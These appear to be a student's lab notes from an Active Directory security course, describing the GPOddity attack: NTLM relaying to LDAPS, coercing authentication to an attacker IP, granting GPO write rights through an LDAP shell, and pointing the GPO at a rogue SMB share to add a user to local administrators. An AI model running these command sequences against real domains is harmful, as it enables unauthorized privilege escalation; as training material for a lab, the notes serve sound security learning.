![[Pasted image 20260131032100.png]]
- PowerView has Immediate Scheduled Task exploitation
	- not covered in this course


# GPOddity

- combines NTLM relaying and modification of Group Policy Container
	- relay creds of a user who has WriteDACL on GPO, can modify path (gPCFileSysPath) of the group policy template (default in SYSVOL)

## Learning Objective

Abuse an overly permissive Group Policy to add student to the local administrator group on dcorp-ci
![[Pasted image 20260203024427.png]]
- Open PowerView
	- `C:\AD\Tools\PowerView.ps1`
- Get GPO info
	- `Get-DomainGPO -Identity 'DevOps Policy'`
- Start NTLM Relay
	- `sudo ntlmrelayx.py -t ldaps://<DC_IP> -wh <attacker_ip> --http-port '80,8080' -i --no-smb-server`
	- if it doesn't work, may have to change SMB settings in config
- need to create a shortcut that will connect to DC and relay back
	- create shortcut in attacker machine, then copy over to victim and execute
![[Pasted image 20260203024753.png]]
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://<attacker_ip>' -UseDefaultCredentials"`

- connect to LDAP shell
	- `nc 127.0.0.1 <port>`
		- port found in ntlmrelayx output
	- can use this LDAP shell to elevate compromised user to local admin or add a computer object and give WriteDACL permissions
		- create computer object if compromised user is not a domain user
- grant user permissions over GPO
	- `write_gpo_dacl <user> {GPO_GUID}'`
		- GPO GUID can be found in GPO info dump (check "Get GPO Info above)
![[Pasted image 20260203025405.png]]

- once the user has write permissions over the GPO, you can run the GPOddity command to elevate
	- `sudo python3 gpoddity.py --gpo-id '<GPO_GUID>' --domain '<DOMAIN>' --username '<compromised_user>' --password '<pass>' --command 'net localgroup administrators <compromised_user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share_name>' --dc-ip <DC_IP> --smb-mode none`
![[Pasted image 20260203025903.png]]
- make sure to create folder that matches the name of the share_name given

- as soon as you run GPOddity, it creates a GPO template, so copy it over to share created
	- `cp -r C:\AD\Tools\GPOddity\GPT_Out\* C:\AD\Tools\<share_name>`

- create and server the share, then grant everyone access
	- `share <share_name>=C:\path\to\share`
	- `icacls "C:\path\to\share" /grant Everyone:F /T`
![[Pasted image 20260203030320.png]]

- verify the attack worked -- GPO should now point to share
	- `Get-DomainGPO -Identity '<GPO>`
![[Pasted image 20260203030413.png]]
- in this env, Group Policy updates every couple minutes, may be different on other envs

- test if the exploit worked
	- `winrs -r:<computer_name> cmd /c "set computername && set username"`
![[Pasted image 20260203030735.png]]
